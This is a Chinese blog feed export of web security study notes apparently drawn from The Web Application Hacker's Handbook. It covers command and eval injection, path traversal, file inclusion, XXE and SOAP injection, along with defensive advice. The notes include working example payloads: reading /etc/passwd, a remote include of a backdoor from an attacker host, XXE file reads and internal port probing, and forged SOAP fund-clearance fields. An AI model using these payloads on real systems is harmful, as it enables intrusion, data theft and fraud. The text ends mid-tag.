title="消除危险的插入点"></a>消除危险的插入点</h4><p>应用程序页面中有一些位置，在这里插入用户提交的输入就会造成极大的风险。</p><ul><li>应尽量避免直接在现有的JavaScript中插入用户可控制的数据。这适用于<Script>标签中的代码，也适用于事件处理器代码。如果应用程序尝试以安全的方式在其中插入数据，可能就会使攻击者有机会避开它们实施的防御性过滤.</li><li>如果标签属性接受URL作为它的值，通常应用程序应该避免嵌入用户输入，因为各种技巧也能引入脚本代码，包括伪协议脚本处理的使用</li><li>如果攻击者通过插入一个相关指令，或者因为应用程序使用一个请求参数指定首选的字符集，因而能够控制应用程序的编码类型，那么这些情况也应该给加以避免。在这种情况下，输入确认和输出确认会失效，因为攻击者的输入进行了不常见的编码，以致于上述过滤并不将其视为恶意输入。只要有可能，应用程序应该在它的响应消息头中指定该一种编码类型，并禁止对它进行修改，并确保应用程序的XSS过滤与其兼容，如：<pre class=" language-bash"><code class="language-bash">Content-Type: text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>ISO-8859-1<span class="token punctuation">;</span></code></pre></li></ul><h4 id="允许有限的HTML"><a href="#允许有限的HTML" class="headerlink" title="允许有限的HTML"></a>允许有限的HTML</h4><p>一些应用程序允许用户以HTML的格式提交即将插入到应用程序响应中的数据。为安全地支持这种功能，应用程序应保持稳健，仅允许有限的HTML子集，避免提供任何引入脚本的方法。有各种框架(如OWASP AntiSamy项目)可用于确认用户提交的HTML标记，以确保其中不包含任何执行JavaScript的方法。建议需要允许用户创建有限HTML的开发者直接使用某个成熟的框架。或许，也可以采用某种定制的中间标记语言，允许用户使用有限的中间标记语言语法，然后由应用程序对其进行处理，以生成相应的HTML标记。</p><h3 id="防止基于DOM的XSS漏洞"><a href="#防止基于DOM的XSS漏洞" class="headerlink" title="防止基于DOM的XSS漏洞"></a>防止基于DOM的XSS漏洞</h3><p>我们上述的防御机制并不能防止基于DOM的XSS漏洞，因为造成这种漏洞并不需要将用户可控制的数据复制到服务器的响应中。</p><p>应用程序应尽量避免使用客户端脚本处理DOM数据并把它插入到页面中，由于被处理的数据不在服务器的直接控制范围内，有时甚至不在它的可见范围内，因此这种行为存在着固定风险。</p><p>如果无法避免要以这种方式使用客户端脚本，我们可以通过两种防御方法防止基于DOM的XSS漏洞，它们分别与前面的输入与输出确认相对应。</p><h4 id="确认输入-1"><a href="#确认输入-1" class="headerlink" title="确认输入"></a>确认输入</h4><p>我们可以通过确认将要插入到文档中的数据仅包含字母数字字符与空白符，从而阻止攻击发生。除这种客户端控制之外，还可以在服务器端对URL数据进行确认，实施深层防御：</p><ul><li>参数个数检查</li><li>参数大小写检查</li><li>确认参数值仅包含数字字母<br>实施了这些控制后，客户端脚本还需对参数值进行解析，确保其中不包含任何URL片断字符。</li></ul><h4 id="确认输出-1"><a href="#确认输出-1" class="headerlink" title="确认输出"></a>确认输出</h4><p>在将用户可控制的DOM数据插入到文档之前，应用程序也可以对它们进行HTML编码。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web安全(9)</title>
      <link href="/2019/11/07/websecurity9/"/>
      <url>/2019/11/07/websecurity9/</url>
      
        <content type="html"><![CDATA[<h2 id="后端组件"><a href="#后端组件" class="headerlink" title="后端组件"></a>后端组件</h2><ul><li>Web应用程序常常作为一系列后端业务关键资源，包括网络资源(如Web服务、后端Web服务器、邮件服务器)和本地资源(如文件系统)的接口及操作系统接口。而且，应用程序还作为这些后端组件的自主访问控制层。任何能够与后端组件进行任意交互的攻击都能够突破Web应用程序实施的整个访问控制模型，从而以未授权的方式访问敏感数据和功能。</li><li>数据在不同的组件间传递时，它们将由不同类型的API和接口解释。被核心应用程序视为安全的数据，在支持不同编码、转义字符、字段分隔符或字符串终止符的上层组件看来，可能极不安全。此外，上层组件可能会有相对多的功能是在应用程序在正常情况下不会调用的。因此，利用注入漏洞的攻击者通常不仅能够突破应用程序的访问控制，甚至能够利用后端组件支持的其他功能来攻破组件基础架构的关键部分。</li></ul><h2 id="注入操作系统命令"><a href="#注入操作系统命令" class="headerlink" title="注入操作系统命令"></a>注入操作系统命令</h2><ul><li>大多数Web应用程序已经能够使用内置的API与服务器的操作系统进行交互，比如，帮助开发者访问文件系统、连接其他进程、进行安全的网络通信。</li><li>如果应用程序向操作系统命令传送用户提交的输入，那么就很可能会造成命令注入攻击。</li></ul><h3 id="通过动态执行注入"><a href="#通过动态执行注入" class="headerlink" title="通过动态执行注入"></a>通过动态执行注入</h3><p>许多Web脚本语言支持动态执行在运行时生成的代码。这种特性允许开发者创建可根据各种数据和条件动态修改器代码的应用程序。如果用户输入合并到可动态执行的代码中，那么攻击者就可以提交专门设计的输入，破坏原有的数据，指定服务器执行自己的命令。这时，攻击者的第一个目标通常是注入运行操作系统命令的API</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>PHP的函数eval可用于动态执行在运行时传送给该函数的代码。下面以一个搜索功能为例，该功能允许用户创建保存的搜索，然后在用户界面上以链接的形式动态生成这些搜索。用户使用URL访问该搜索功能：</p><pre class=" language-bash"><code class="language-bash">/search.php?storedsearch<span class="token operator">=</span>\<span class="token variable">$myresearch</span>%3dwahh</code></pre><p>服务器端通过动态生成变量来执行这项功能，生成的变量包含在storedsearch参数中指定的名/值对；此处，它创建值为wahh的变量myresearch</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$storedsearch</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'storedsearch'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>eval<span class="token punctuation">(</span><span class="token string">"<span class="token variable">$storedsearch</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这时，就可以提交专门设计的输入，由eval函数动态执行，从而在服务器端应用程序中注入任意PHP命令。分号字符可用于在单独一个参数中将几个命令连接在一起。例如，要检索文件/etc/password的内容，可以使用file_get_contents或system命令</p><pre class=" language-bash"><code class="language-bash">/search.php?storedsearch<span class="token operator">=</span>\<span class="token variable">$myresearch</span>%3dwahh<span class="token punctuation">;</span>%20echo%20file_get_contents<span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span></code></pre><h3 id="查找OS命令注入漏洞"><a href="#查找OS命令注入漏洞" class="headerlink" title="查找OS命令注入漏洞"></a>查找OS命令注入漏洞</h3><p>应用程序发出的操作系统命令中可能包含用户提交的任何数据项，包括每个URL，请求主体参数以及cookie。不同的命令解释器处理shell元字符的方式不同。任何类型的应用程序开发平台或Web服务器可能会调用任何shell解释器，在它自己或其他主机的操作系统上运行。<br>有两种类型的元字符可用于在一个现有的预先设定的命令中注入一个独立的命令</p><ul><li>字符;|&amp;和换行符可用于将几个命令逐个连接在一起，可以成对使用这些字符以达到不同的效果。例如，在Windows命令解释器中，使用&amp;&amp;表示第二个命令只有在第一个命令执行结束才会执行；||表示无论第一个命令是否运行成功，都只运行第二个命令。</li><li>反引号(`)用于将一个独立的命令包含在最初的命令处理的数据中。把一个注入的命令放在反引号内shell解释器就会执行该命令，并用这个命令的结果代替被包含的文本，然后继续执行得到的命令字符串</li></ul><p>通常，检测命令注入是否可行的方法是使用时间延迟推断，类似于在Web安全(8)中讨论的那样</p><blockquote><p>注：许多命令注入攻击要求注入空格以分隔命令行自变量。在UNIX中，攻击者可以用包含空白符字段分隔符的$IFS环境变量代替空格</p></blockquote><h3 id="查找动态执行漏洞"><a href="#查找动态执行漏洞" class="headerlink" title="查找动态执行漏洞"></a>查找动态执行漏洞</h3><p>动态执行漏洞最常见于PHP和Perl等语言。基本上，任何应用程序平台都可能会向基于脚本的解释器(有时位于其他后端服务器上)传送用户提交的输入。</p><h3 id="防止OS命令注入"><a href="#防止OS命令注入" class="headerlink" title="防止OS命令注入"></a>防止OS命令注入</h3><ul><li>通常来说，防止OS命令注入漏洞的最佳方法是完全避免直接调用操作系统命令。几乎Web应用程序所需要执行的每个任务都可以使用内置API完成，而且攻击者无法控制这些API进行操作。</li><li>如果无法避免要在传送给操作系统命令解释器的命令字符串中插入用户提交的数据，如果可能，应使用一份“白名单”限制用户只输入一组特殊的值，或者将输入范围设置为少数少数字符。</li><li>应用程序应使用命令API通过它的名称和命令行参数启动特殊的进程，而不是向支持命令连接和重定向的shell解释器传送字符串。</li></ul><h3 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h3><p>防止脚本注入漏洞的最佳方法是，避免将用户提交的输入或者来自用户的数据传送给任何动态执行或包含函数。</p><h2 id="操作文件路径"><a href="#操作文件路径" class="headerlink" title="操作文件路径"></a>操作文件路径</h2><p>Web应用程序中许多功能通常都需要处理用户以文件或目录名提交的输入。一般情况下，这些输入会提交给接受文件路径的API(例如，用于检索本地文件系统中的文件)。应用程序将会在它对用户请求的响应中处理该API调用的结果。如果用户提交的输入未经过正确确认，这种行为就可能导致各种安全漏洞，其中最常见的就是文件路径遍历漏洞和文件包含漏洞。</p><h3 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h3><p>如果应用程序使用用户可控制的数据、以危险的方式访问位于应用程序服务器或其他后端文件系统中的文件和目录，就会出现路径遍历漏洞。通过提交专门设计的输入，攻击者就可以在被访问的系统文件中读取或写入任何内容。<br>在下面的示例中，应用程序使用一个动态页面向客户端返回静态图像。被请求图像的名称在查询字符串参数中指定：</p><pre class=" language-bash"><code class="language-bash">https://masec.net/filestore/8/GetFile.ashx?filename<span class="token operator">=</span>photo.jpg</code></pre><p>当服务器处理这个请求时，它执行以下操作：</p><ol><li>从查询字符串中提交filename参数值</li><li>将这个值附加在C:\filestore\之后</li><li>用这个名称打开文件</li><li>读取文件内容并将其返回给客户端<br>攻击者可以将路径遍历序列放入文件名内，从第2步指定的图像目录向上回溯，从而访问服务器上的任何一个文件。路径遍历序列表示为“点-点-斜线”(..)，一个典型的攻击如下：<pre class=" language-bash"><code class="language-bash">https://masec.net/filestore/8/GetFile.ashx?filename<span class="token operator">=</span><span class="token punctuation">..</span>\windows\win.ini</code></pre>当第二步时应用程序把filename参数的值附加到图像目录名称之后，就可以得到如下路径：<pre class=" language-bash"><code class="language-bash">C:\filestore\<span class="token punctuation">..</span>\windows\win.ini</code></pre>这两个遍历序列立即从图像目录回溯到C:驱动器根目录下，因此前面的路径等同于以下路径：<pre class=" language-bash"><code class="language-bash">C:\windows\win.ini</code></pre>因此，服务器不会返回图像，而是返回默认的Windows配置文件。这种攻击早已广为人知，应用程序通过会针对它们实施各种防御，大多数情况下是采取输入确认过滤。但如下文所述，这种过滤仍然可被避开。</li></ol><blockquote><p>注：服务器进程默认以权限较低的用户账户运行，因此，在探查路径遍历漏洞时，最好是请求一个可由任何类型的用户读取的默认文件。如C:\windows\win.ini</p></blockquote><h4 id="查找和利用路径遍历漏洞"><a href="#查找和利用路径遍历漏洞" class="headerlink" title="查找和利用路径遍历漏洞"></a>查找和利用路径遍历漏洞</h4><h5 id="确定攻击目标"><a href="#确定攻击目标" class="headerlink" title="确定攻击目标"></a>确定攻击目标</h5><p>在对应用程序进行的初步解析中，要确定所有与路径遍历漏洞有关的明显受攻击面。主要用于文件下载或上传目的的所有功能都应进行全面测试</p><h5 id="探查路径遍历漏洞"><a href="#探查路径遍历漏洞" class="headerlink" title="探查路径遍历漏洞"></a>探查路径遍历漏洞</h5><p>在测试用户提交的参数时，需确定遍历序列是否被应用程序阻止，或者它们是否能够正常工作。通常，提交不会向上回溯到起始目录的遍历序列是一种较为可靠的初步测试方法。如果发现提交遍历序列但不会向上回溯到起始目录不会影响应用程序行为，那么接下来的测试中，应该尝试遍历出起始目录，从服务器文件系统的其他地方访问文件。</p><h5 id="避开遍历攻击障碍"><a href="#避开遍历攻击障碍" class="headerlink" title="避开遍历攻击障碍"></a>避开遍历攻击障碍</h5><p>对路径遍历漏洞采用的常用输入过滤方法有：</p><ul><li>检查文件名参数是否存在任何路径遍历序列。如果存在，要么拒绝包含遍历序列的请求，要么尝试删除该序列，以对它的输入进行净化。</li><li>确认用户提交的输入是否包含应用程序想要的后缀(如文件类型)或前缀(如起始目录）。这种类型的防御可以与前面描述的过滤混合使用 </li></ul><h5 id="处理定制编码"><a href="#处理定制编码" class="headerlink" title="处理定制编码"></a>处理定制编码</h5><p>应用程序采用的文件名编码方案最终以危险的方式进行处理，模糊处理也不能提供任何安全保障，这时就会出现最可怕的路径遍历漏洞。<br>例如，一个应用程序允许用户上传和下载文件。如果一个文件上传成功，那么应用程序再为用户提供一个下载URL。<br>可以通过以下方法给直接利用漏洞设立障碍</p><ul><li>应用程序核对将要写入的文件是否已经存在，如果已经存在，就拒绝重写这个文件</li><li>为下载用户文件而生成的URL使用一种定制模糊处理方案表示。这种方案是一种定制的Base64编码形式，它在每个编码文件名位置使用一组不同的字符。</li></ul><h4 id="防止路径遍历漏洞"><a href="#防止路径遍历漏洞" class="headerlink" title="防止路径遍历漏洞"></a>防止路径遍历漏洞</h4><p>迄今为止，避免向任何文件系统API传送用户提交的数据是防止路径遍历漏洞的最有效方法。以下是一些可能有用的防御方法，最好将它们组合使用</p><ol><li>对用户提交的文件名进行相关解码与规范化后，应用程序检查应检查文件名是否包含路径遍历序列(使用反斜线或斜线)或空字节。如果是这样，应用程序应停止处理请求，不得尝试对恶意文件名进行任何净化处理</li><li>应用程序应使用一个硬编码的、允许访问的文件类型列表，并拒绝任何访问其他文件类型的请求(完成解码与规范化后)。</li><li>对用户提交的用户名进行一切必要的过滤后，应用程序应使用适当的文件系统API确认是否一切正常，以及使用该文件名访问的文件是否位于应用程序指定的起始目录中。</li></ol><ul><li>在Java中，可以通过使用用户提交的文件名示例一个<font color="#fb8c00">java.io.File</font>对象，然后对这个对象调用<font color="#fb8c00">getCanonicalPath</font>方法，即可到达上述目的。</li><li>在ASP.NET中，可以将用户提交的文件名传送给<font color="#fb8c00">System.Io.Path.GetFullPath</font>方法，并对字符串执行和上述java中一样的检查，从而达到相同的目的。</li><li>应用程序中可以使用一个<font color="#fb8c00">chrooted</font>环境访问包含被访问文件的目录，减轻大多数路径遍历漏洞造成的影响。在这种情况下，<font color="#fb8c00">chrooted</font>目录就好比是文件系统的根目录，任何试图从这个目录向上回溯的多余遍历请求都应该被忽略。大多数UNIX系统平台都支持chrooted文件系统。在Windows平台上，以新逻辑驱动器的形式安装相关起始目录，并且使用相应的驱动器字母访问目录内容，即可实现类似效果。</li><li>应用程序应将路径遍历攻击防御机制与日志和报警系统结合在一起。任何时候，只要收到一个包含路径遍历序列的请求，提出请求的用户就可能心存恶意，应用程序应在日志中进行记录，标明该请求企图违反安全机制，并终止该用户会话，如有可能，应冻结该用户账户并向管理员发出警报。</li></ul><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>许多脚本语言支持使用包含文件(include file)。这种功能允许开发者把可重复使用的代码插入到单个的文件中，并在需要时将它们包含在特殊功能的代码文件中。然后，包含代码的文件被解释，就像它插入到包含指令的位置一样</p><h4 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h4><p>PHP语言特别容易出现文件包含漏洞，因为它的包含函数接受远程文件的路径。这种缺陷已经成为PHP应用程序中大量漏洞的根源</p><h6 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h6><p>以一个向不同位置的人们传送各种内容的应用程序为例。用户选择他们的位置后，这个信息通过一个请求参数传送给服务器：</p><pre class=" language-bash"><code class="language-bash">https://wahh-app.com/main.php?Country<span class="token operator">=</span>China</code></pre><p>应用程序通过以下方法处理Country参数：</p><pre class=" language-bash"><code class="language-bash"><span class="token variable">$country</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">(</span><span class="token string">'Country'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>include<span class="token punctuation">(</span><span class="token variable">$country</span><span class="token keyword">.</span> <span class="token string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这种执行环境加载位于Web服务器文件系统中的China.php文件，然后，这个文件的内容被复制到main.php文件中，并得以执行。<br>攻击者能够通过各种方法利用这种行为，最严重的情况是指定一个外部的URL作为包含文件的位置。PHP函数接受这个位置作为输入，接着，执行环境将获取指定的文件并执行其内容。因此，攻击者能够构建一个包含任意复杂内容的恶意脚本，将其寄存在他控制的Web服务器上，并通过易受攻击的应用程序函数调用它然后执行。例如：</p><pre class=" language-bash"><code class="language-bash">https://wahh-app.com/main.php?Country<span class="token operator">=</span>http://wahh-attacker.com/backdoor</code></pre><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4><p>有时，应用程序根据用户可控制的数据加载包含文件，但这时不可能给位于外部服务器上的文件指定URL。例如，如果用户可控制的数据被提交给ASP函数Server.Execute，那么攻击者就可以执行任意一段ASP脚本，只要这段脚本属于调用这个函数的相同应用程序。<br>在这种情况下，攻击者仍然可以利用应用程序的行为执行未授权操作：</p><ul><li>在服务器上可能有一些通过正常途径无法访问的文件，例如，任何访问路径/admin的请求夺回被应用程序实施的访问控制阻止。如果能够将敏感功能包含在一个授权访问的页面中，那么就可以访问那个功能。</li><li>服务器上的一些静态资源也受到同样的保护，无法直接访问。如果能将这些信息动态地包含在其他应用程序页面中，那么执行环境就会将静态资源的内容复制到它的响应中。</li></ul><h4 id="查找文件包含漏洞"><a href="#查找文件包含漏洞" class="headerlink" title="查找文件包含漏洞"></a>查找文件包含漏洞</h4><p>任何用户提交的数据项都可能引起文件包含漏洞。它们经常出现在指定一种语言或一个位置的请求参数中，也常常发生在以参数形式传送服务器端文件名的情况下。</p><h2 id="注入XML解释器"><a href="#注入XML解释器" class="headerlink" title="注入XML解释器"></a>注入XML解释器</h2><p>今天的Web应用程序大量使用XML,在浏览器和前端应用程序服务器之间传送的请求和响应，以及在后端应用程序组件(如SOAP服务)之间传送的消息中都可以找到XML。</p><h3 id="注入XML外部实体-XXE"><a href="#注入XML外部实体-XXE" class="headerlink" title="注入XML外部实体(XXE)"></a>注入XML外部实体(XXE)</h3><p>XML常用于从客户端向服务器提交数据。然后，服务器端应用程序将处理这些数据，并且可能会返回一个包含XML或任何其他格式数据的响应。在使用异步请求在后台进行通信的基于Ajax的应用程序中，这种行为最为常见。浏览器扩展组件或其他客户端技术也会用到XML。<br>实体引用：如，与&lt;和&gt;对应的实体如下所示：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&amp;</span>lt<span class="token punctuation">;</span><span class="token operator">&amp;</span>gt<span class="token punctuation">;</span></code></pre><ul><li>之所以会产生XML外部实体(XXE)注入漏洞，是因为标准的XML解析库支持使用实体引用。这些引用仅仅是在XML文档内部或外部引用数据的一种方法。XML格式允许在XML文档中定义定制实体。这些实体在文档开始部分的可选DOCTYPE元素中定义。如：<pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE foo <span class="token punctuation">[</span> <span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY testref <span class="token string">"testrefvalue"</span><span class="token operator">></span> <span class="token punctuation">]</span> <span class="token operator">></span></code></pre>通过文档中包含以上定义，解析器将用testrefvalue这个已定义的值替代文档中出现的任何testref;实体引用。</li></ul><p>此外，XML规范允许使用外部引用来定义实体，XML解析器将动态提取这些实体的值。这些外部实体定义采用URL格式，并可以引用外部Web URL或本地文件系统上的资源。XML解析器将提取指定的URL或文件的内容，并将其作为已定义实体的值。如果应用程序在响应中返回任何外部定义的实体的XML数据，则指定该URL或文件的内容将在该响应中返回。</p><p>攻击者可以通过向XML添加适当的DOCTYPE元素，或通过修改该元素,在基于XML的请求中指定外部实体。外部引用实体使用关键字SYSTEM来指定，并使用URL(可能使用file:协议)进行定义。</p><p>例如，以一个使用AJax实现的、提供无缝用户体验的搜索功能为例。在用户输入搜索词时，客户端脚本将向服务器提出以下请求：</p><pre class=" language-bash"><code class="language-bash">POST /search/128/AjaxSearch.ashx HTTP/1.1Host: mdsec.netContent-Type: text/xml<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8Content-Length: 44<span class="token operator">&lt;</span>Search<span class="token operator">></span><span class="token operator">&lt;</span>SearchTerm<span class="token operator">></span>nothing will change<span class="token operator">&lt;</span>/SearchTerm<span class="token operator">></span><span class="token operator">&lt;</span>/Search<span class="token operator">></span></code></pre><p>攻击者可以就此提交以下请求：</p><pre class=" language-bash"><code class="language-bash">POST /search/128/AjaxSearch.ashx HTTP/1.1Host: mdsec.netContent-Type: text/xml<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8Content-Length: 115<span class="token operator">&lt;</span><span class="token operator">!</span> DOCTYPE foo <span class="token punctuation">[</span> <span class="token operator">&lt;</span><span class="token operator">!</span> ENTITY xxe SYSTEM <span class="token string">"file://windows/win.ini"</span><span class="token operator">></span> <span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>Search<span class="token operator">></span><span class="token operator">&lt;</span>SearchTerm<span class="token operator">></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/SearchTerm<span class="token operator">></span><span class="token operator">&lt;</span>/Search<span class="token operator">></span></code></pre><p>收到这个请求之后，XML解析器将提取指定文件的内容，并使用该内容来替代已定义的实体利用(攻击者已在SearchTerm元素中使用了该实体引用)。由于SearchTerm元素的值会在应用程序的响应中回显，这会导致服务器以该文件的内容做出响应，如下所示：</p><pre class=" language-bash"><code class="language-bash">HTTP/1.1 200 OKContent-Type: text/xml<span class="token punctuation">;</span> charset<span class="token operator">=</span>utf-8Content-Length: 556<span class="token operator">&lt;</span>Search<span class="token operator">></span><span class="token operator">&lt;</span>SearchResult<span class="token operator">></span>No results found <span class="token keyword">for</span> expression: <span class="token punctuation">;</span> <span class="token keyword">for</span> 16-bit wahh-app support<span class="token punctuation">[</span>fonts<span class="token punctuation">]</span><span class="token punctuation">[</span>extensions<span class="token punctuation">]</span><span class="token punctuation">[</span>mci extensions<span class="token punctuation">]</span><span class="token punctuation">[</span>files<span class="token punctuation">]</span><span class="token punctuation">..</span>.</code></pre><p>除使用file:协议来指定本地文件系统上的资源外，攻击者还可以使用http:等协议让服务器通过网络提取资源。这些URL可以指定任意主机、IP地址和端口。攻击者可以利用它们与后端系统上无法通过因特网直接访问的网络服务进行交互。例如，以下攻击尝试连接到在专用IP地址上192.168.1.1的端口25上运行的邮件服务器：</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span> DOCTYPE foo <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span> ENTITY xxe SYSTEM <span class="token string">"http://192.168.1.1"</span><span class="token operator">></span> <span class="token punctuation">]</span><span class="token operator">></span><span class="token operator">&lt;</span>Search<span class="token operator">></span><span class="token operator">&lt;</span>SearchTerm<span class="token operator">></span><span class="token operator">&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/SearchTerm<span class="token operator">></span><span class="token operator">&lt;</span>/Search<span class="token operator">></span></code></pre><p>通过这种技巧可以实施各种攻击，如下所示：</p><ul><li>攻击者可以将应用程序作为代理服务器使用，从应用程序能够访问的任何Web服务器上检索敏感内容，包括那些在组织内部的专用非路由地址空间运行的内容。</li><li>攻击者可以通过攻击大量IP地址和端口号，对后端系统上的开放端口进行测试。在某些情况下，可以使用时间性差异来推断所请求的端口的状态。其他时候，应用程序可能会在响应中返回某些服务的服务标题(service banner)</li></ul><p>最后，如果应用程序检索外部实体，但并不在响应中返回该实体，则攻击者仍然可以通过无期限地读取某个文件流，从而实施拒绝服务攻击。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span><span class="token operator">!</span> DOCTYPE foo <span class="token punctuation">[</span> <span class="token operator">&lt;</span><span class="token operator">!</span> ENTITY xxe SYSTEM <span class="token string">"file:///dev/random"</span><span class="token operator">></span> <span class="token punctuation">]</span> <span class="token operator">></span></code></pre><h3 id="注入SOAP"><a href="#注入SOAP" class="headerlink" title="注入SOAP"></a>注入SOAP</h3><p>SOAP(Simple Object Access Protocol，简单对象访问协议)是一种使用XML格式封装数据、基于消息的通信技术。各种在不同操作系统和架构上运行的系统也使用它来共享信息和传递消息，它主要用于Web服务中；通过浏览器访问的Web应用程序常常使用SOAP在后端应用程序组件之间进行通信。<br>由于XML是一种解释型语言，因此，和前面的描述的其他示例一样，SOAP也易于受到代码注入攻击。XML元素通过元字符&lt;、&gt;和/以语法形式表述。如果用户提交的数据中包含这些字符，并被直接插入这些SOAP消息中，攻击者就能破坏消息的结构，进而破坏应用程序的逻辑。</p><p>以一个银行用户为例，一名用户正在使用下面的HTTP请求进行转账：</p><pre class=" language-bash"><code class="language-bash">POST /bank/27/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 65FromAccount<span class="token operator">=</span>1828110<span class="token operator">&amp;</span>Amount<span class="token operator">=</span>1430<span class="token operator">&amp;</span>ToAccount<span class="token operator">=</span>08447656<span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit</code></pre><p>在处理这个请求的过程中，应用程序在两个后端组件之间传送SOAP消息:</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">&lt;</span>soap:Envelop xmlns:soap<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/12/soap-envelop"</span><span class="token operator">></span>  <span class="token operator">&lt;</span>soap:Body<span class="token operator">></span>    <span class="token operator">&lt;</span>pre:Add xmlns:pre<span class="token operator">=</span>http://target/lists soap:encodingStyle<span class="token operator">=</span><span class="token string">"http://www.w3.org/200/12/soap-encoding"</span><span class="token operator">></span>        <span class="token operator">&lt;</span>Account<span class="token operator">></span>          <span class="token operator">&lt;</span>FromAccount<span class="token operator">></span>1828110<span class="token operator">&lt;</span>/FromAccount<span class="token operator">></span>          <span class="token operator">&lt;</span>Amount<span class="token operator">></span>1430<span class="token operator">&lt;</span>/Amount<span class="token operator">></span>          <span class="token operator">&lt;</span>ClearedFunds<span class="token operator">></span>false<span class="token operator">&lt;</span>/ClearedFunds<span class="token operator">></span>        <span class="token operator">&lt;</span>/Account<span class="token operator">></span>     <span class="token operator">&lt;</span>/pre:Add<span class="token operator">></span>   <span class="token operator">&lt;</span>/soap:Body<span class="token operator">></span> <span class="token operator">&lt;</span>/soap:Envelop<span class="token operator">></span></code></pre><p>注意消息中的XML元素如何与HTTP请求中的参数对应过来，以及应用程序如何添加ClearedFunds元素。这时，应用程序逻辑确定账户没有足够的资金来转账，并将这个元素(ClearedFunds)的值设为False,因此收到SOAP消息的组件将拒绝转账。<br>在这种情况下，攻击者可以通过各种方法注入SOAP消息，从而破坏应用程序的逻辑。例如，提交下面的请求会在最初的元素之前插入另外一个ClearedFunds元素(同时保持SQL语法的有效性),如果应用程序处理它遇到的第一个ClearedFundsu元素，那么即使账户中没有资金，也可以成功进行转账。</p><pre class=" language-bash"><code class="language-bash">POST /bank/27/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 119FromAccount<span class="token operator">=</span>1828110<span class="token operator">&amp;</span>Amount<span class="token operator">=</span>1043<span class="token operator">&lt;</span>/Amount<span class="token operator">></span><span class="token operator">&lt;</span>ClearedFunds<span class="token operator">></span>True<span class="token operator">&lt;</span>/ClearedFunds<span class="token operator">></span><span class="token operator">&lt;</span>Amount<span class="token operator">></span>1430<span class="token operator">&amp;</span>ToAccount<span class="token operator">=</span>08447656<span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit</code></pre><p>另一方面，如果应用程序处理它遇到的后一个ClearedFunds元素，攻击者就可以在ToAccount参数中注入一个类似的攻击。<br>另一种类型的攻击是使用XML注释完全删除原始SOAP消息中的一个元素，并用攻击者自己设计的元素代替被删除的元素。<br>例如，下面的请求通过Amount参数注入一个ClearedFunds元素，为ToAccount元素建立一个起始标签，开始一段注释，并在ToAccount参数中结束注释，从而保持XML语法的有效性</p><pre class=" language-bash"><code class="language-bash">POST /bank/27/Default.aspx HTTP/1.0Host: mdsec.netContent-Length: 125FromAccount<span class="token operator">=</span>1828110<span class="token operator">&amp;</span>Amount<span class="token operator">=</span>1043<span class="token operator">&lt;</span>/Amount<span class="token operator">></span><span class="token operator">&lt;</span>ClearedFunds<span class="token operator">></span>True<span class="token operator">&lt;</span>/ClearedFunds<span class="token operator">></span><span class="token operator">&lt;</span>ToAccount<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span>--<span class="token operator">&amp;</span>ToAccount<span class="token operator">=</span>--<span class="token operator">></span>08447656<span class="token operator">&amp;</span>Submit<span class="token operator">=</span>Submit</code></pre><h3 id="查找并利用SOAP注入"><a href="#查找并利用SOAP注入" class="headerlink" title="查找并利用SOAP注入"></a>查找并利用SOAP注入</h3><p>SOAP注入可能很难被发现，因为随意提交XML元字符会破坏SOAP消息的格式，而且这样做生成的错误消息也极其简单。但是，下面的步骤仍然可以相对可靠地检测出SOAP注入漏洞。</p><ul><li>轮流在每个参数中提交一个恶意XML结束标签，如&lt; /foo&gt;。如果没有发生错误，那么输入可能没有插入到SOAP消息中，或者以某种方式被净化了。</li><li>如果出现错误，提交一对有效的起始和结束标签，如&lt; foo&gt;&lt; /foo&gt;。如果这对标签使错误消失，那么应用程序很有可能易于受到攻击。</li><li>有些时候，插入到XML格式消息中的数据随后以XML格式被读取并返回给用户。如果修改的数据项在应用程序的响应中返回，看看提交任意的XML内容是否会以相同的形式返回。或者已通过某种方式被规范化。轮流提交下面两个值：<br><font color="#fb8c00">test<foo/></font>  <font 